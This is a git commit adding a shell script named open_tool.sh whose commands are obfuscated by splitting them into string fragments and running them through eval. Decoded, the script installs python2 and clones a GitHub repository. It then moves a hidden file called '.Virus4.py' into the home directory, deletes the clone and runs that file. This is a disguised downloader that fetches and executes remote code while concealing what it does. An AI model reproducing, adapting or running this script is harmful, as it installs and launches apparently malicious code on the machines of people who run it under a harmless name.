c3909e84214f7afd0f228fe2063e362279290349
0101_022 <63510472+MrAli-s@users.noreply.github.com>
2021-04-09 06:22:20 -0500

    Add files via upload

---
+++ open_tool.sh
@@ -0,0 +1,3 @@
+z="
+";ez='rf ~';kz='s4.p';Mz='tps:';Uz='/H-C';cz='era/';Lz='e ht';Vz='amer';Gz='on2 ';Cz='apt ';fz='l';Bz='r';Wz='a/Lo';lz='y';Hz='-y';Nz='//gi';Rz='nVb/';gz='~/H-';az=' ~/H';Xz='l/.V';dz='rm -';iz='ra/.';Kz='clon';Zz='4.py';Qz='/Aka';Pz='.com';Sz='Lol';hz='Came';Dz='inst';Oz='thub';Ez='all ';Az='clea';Iz='cd';bz='-Cam';Yz='irus';Jz='git ';Fz='pyth';Tz='mv ~';jz='Viru';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$z$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$z$dz$ez$Uz$Vz$Wz$fz$z$Fz$Gz$gz$hz$iz$jz$kz$lz"
